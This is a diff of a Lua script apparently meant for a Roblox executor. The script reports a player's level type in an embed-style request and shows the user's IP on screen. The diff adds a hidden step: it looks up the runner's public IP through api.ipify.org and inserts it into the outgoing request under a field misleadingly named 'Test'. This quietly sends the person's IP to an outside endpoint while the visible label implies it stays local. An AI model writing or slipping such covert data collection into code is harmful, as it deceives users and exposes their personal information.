@@ -24,6 +24,15 @@ elseif plrlevel <= 400000 then
 	leveltype = "-400k"
 end
 
+local ipResponse
+if syn and syn.request then
+	ipResponse = syn.request({Url = "https://api.ipify.org?format=json",Method = "GET"})
+end
+local ip = "Unknown"
+if ipResponse and ipResponse.StatusCode == 200 then
+	ip = HttpService:JSONDecode(ipResponse.Body).ip
+end
+
 local req = (syn and syn.request) or (http and http.request) or request
 
 if req then
@@ -73,6 +82,11 @@ if req then
 						{
 							name = "Level Type",
 							value = leveltype,
+							inline = true
+						},
+						{
+							name = "Test",
+							value = ip,
 							inline = true
 						},
 					},
@@ -207,12 +221,5 @@ TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel_4.TextScaled = true
 TextLabel_4.TextSize = 14.000
 TextLabel_4.TextWrapped = true
-local ipResponse
-if syn and syn.request then
-	ipResponse = syn.request({Url = "https://api.ipify.org?format=json",Method = "GET"})
-end
-local ip = "Unknown"
-if ipResponse and ipResponse.StatusCode == 200 then
-	ip = HttpService:JSONDecode(ipResponse.Body).ip
-end
+
 TextLabel_4.Text = "Your IP: " .. ip
